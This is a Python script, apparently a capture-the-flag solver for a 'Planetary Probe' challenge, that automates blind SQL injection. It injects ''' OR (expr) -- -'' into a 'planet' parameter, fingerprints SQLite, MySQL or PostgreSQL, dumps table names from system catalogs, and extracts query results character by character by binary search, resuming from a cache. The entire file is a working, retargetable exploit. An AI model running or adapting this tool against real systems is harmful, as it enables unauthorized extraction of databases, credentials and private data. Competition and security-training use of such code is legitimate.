#!/usr/bin/env python3
"""Blind SQL injection helper for Planetary Probe.

Usage:
  python solve.py test
  python solve.py schema
  python solve.py extract "SELECT flag FROM flags LIMIT 1"

Recovered characters are saved incrementally in .probe-cache.json so an
interrupted extraction can be resumed.
"""

import argparse
import json
import os
import sys
import time

import requests

URL = "https://planetary.web.2026.sunshinectf.games/probe"
CACHE_FILE = os.path.join(os.path.dirname(__file__), ".probe-cache.json")


class Oracle:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "PlanetaryProbe/1.0"
        self.cache = json.load(open(CACHE_FILE)) if os.path.exists(CACHE_FILE) else {}
        self.calls = 0

    def check(self, expression):
        # The closing quote escapes the planet name; OR turns the lookup into
        # a boolean oracle. Everything after it is commented out.
        payload = "' OR (" + expression + ") -- -"
        for attempt in range(3):
            try:
                response = self.session.get(
                    self.url, params={"planet": payload}, timeout=(4, 10)
                )
                if response.status_code != 200:
                    raise RuntimeError(f"HTTP {response.status_code}")
                if "is-carrier" not in response.text and "is-null" not in response.text:
                    raise RuntimeError("Unrecognized response; check the carrier marker")
                self.calls += 1
                return "is-carrier" in response.text
            except (requests.RequestException, RuntimeError) as exc:
                if attempt == 2:
                    raise RuntimeError(f"Probe failed: {exc}") from exc
                time.sleep(0.5 * (attempt + 1))

    def integer(self, expression):
        # Handles zero and positive values. The expression should be scalar.
        high = 1
        while self.check(f"({expression})>{high}"):
            high *= 2
            if high > 1_000_000:
                raise RuntimeError("Integer unexpectedly large")
        low = 0
        while low < high:
            mid = (low + high) // 2
            if self.check(f"({expression})>{mid}"):
                low = mid + 1
            else:
                high = mid
        return low

    def extract(self, query, dialect):
        key = dialect + ":" + query
        out = self.cache.get(key, "")
        length = self.integer(f"SELECT length(({query}))")
        print(f"[{length} characters] {out}", flush=True)
        if len(out) > length:
            out = out[:length]
        character = "unicode" if dialect == "sqlite" else "ascii"
        for pos in range(len(out) + 1, length + 1):
            # Flags, identifiers and SQL DDL should be printable ASCII.
            code = self.integer_bound(
                f"{character}(substr(({query}),{pos},1))", 31, 127
            )
            if not 32 <= code <= 126:
                raise RuntimeError(f"Non-printable code {code} at position {pos}")
            out += chr(code)
            self.cache[key] = out
            with open(CACHE_FILE, "w") as handle:
                json.dump(self.cache, handle, indent=2)
            print(chr(code), end="", flush=True)
        print()
        return out

    def integer_bound(self, expression, low, high):
        while low < high:
            mid = (low + high) // 2
            if self.check(f"({expression})>{mid}"):
                low = mid + 1
            else:
                high = mid
        return low


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("command", choices=["test", "schema", "extract", "check"])
    parser.add_argument("expression", nargs="?")
    parser.add_argument("--url", default=URL)
    parser.add_argument("--dialect", choices=["sqlite", "mysql", "postgres"])
    args = parser.parse_args()
    oracle = Oracle(args.url)
    true, false = oracle.check("1=1"), oracle.check("1=2")
    print(f"Oracle: true={true}, false={false}", flush=True)
    if (true, false) != (True, False):
        raise RuntimeError("SQL injection not confirmed; inspect payload/marker")
    if args.command == "test":
        return
    dialect = args.dialect
    if not dialect:
        if oracle.check("sqlite_version() IS NOT NULL"):
            dialect = "sqlite"
        elif oracle.check("database() IS NOT NULL"):
            dialect = "mysql"
        elif oracle.check("version() IS NOT NULL"):
            dialect = "postgres"
        else:
            raise RuntimeError("Cannot identify SQL dialect")
    print("Dialect:", dialect, flush=True)
    if args.command == "check":
        print(oracle.check(args.expression))
    elif args.command == "extract":
        if not args.expression:
            parser.error("extract needs a scalar SELECT query")
        oracle.extract(args.expression, dialect)
    elif args.command == "schema":
        if dialect == "sqlite":
            query = "SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'"
        elif dialect == "mysql":
            query = ("SELECT group_concat(table_name SEPARATOR '|') "
                     "FROM information_schema.tables WHERE table_schema=database()")
        else:
            query = ("SELECT string_agg(tablename,'|') FROM pg_tables "
                     "WHERE schemaname=current_schema()")
        oracle.extract(query, dialect)
    print("Requests:", oracle.calls)


if __name__ == "__main__":
    main()
